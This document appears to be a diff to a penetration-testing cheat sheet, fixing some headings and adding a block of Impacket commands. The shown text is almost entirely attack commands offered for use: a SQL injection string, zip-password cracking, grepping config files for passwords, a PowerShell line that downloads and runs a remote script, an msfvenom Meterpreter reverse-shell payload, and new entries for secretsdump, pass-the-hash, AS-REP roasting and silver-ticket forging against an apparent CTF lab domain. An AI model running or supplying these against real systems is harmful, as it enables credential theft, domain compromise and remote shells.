@@ -811,7 +811,7 @@ test' or 1=2 or 'a'='a
 ```
 
 ### Password Attacks
-#### frack
+#### fcrack
 ```c
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file>.zip
 ```
@@ -921,11 +921,43 @@ grep -R db_passwd
 grep -roiE "password.{20}"
 grep -oiE "password.{20}" /etc/*.conf
 ```
+#### Impacket
+##### Basic Commands
+```c
+psexec.py <user>@<remote_ip>
+sudo impacket-smbserver local . -smb2support
+rpcdump.py <target_domain>/<user>:<password/hash>@<remote_ip>
+smbclient.py <target_domain>/<user>:<password/hash>@<remote_ip>
+lookupsid.py <target_domain>/<user>:<password/hash>@<remote_ip>
+reg.py <target_domain>/<user>:[password:password hash]@<remote_ip> <action> <action>
+```
+##### Database Connections
+```c
+mssqlclient.py <user>@<remote_ip>
+mssqlclient.py <user>@<remote_ip> -windows-auth
+```
+##### Forging Silver Ticket
+```c
+getST.py intelligence.htb/svc_int$  -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+```
+##### ASPRepRoast
+```c
+GetNPUsers.py <target_domain>.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+```
+##### PassTheHash
+```c
+getTGT.py <domain>.local/<user> -dc-ip <domain>.local -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
+```
+##### SecretsDump
+```c
+secretsdump.py <domain>/<user>@<remote_ip>
+secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+```
 #### JAWS
 ```c
 IEX(New-Object Net.webclient).downloadString('http://<local_ip>:<local_port>/jaws-enum.ps1')
 ```
-#### JuicyPotato
+#### Juicy Potato
 ```c
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
 
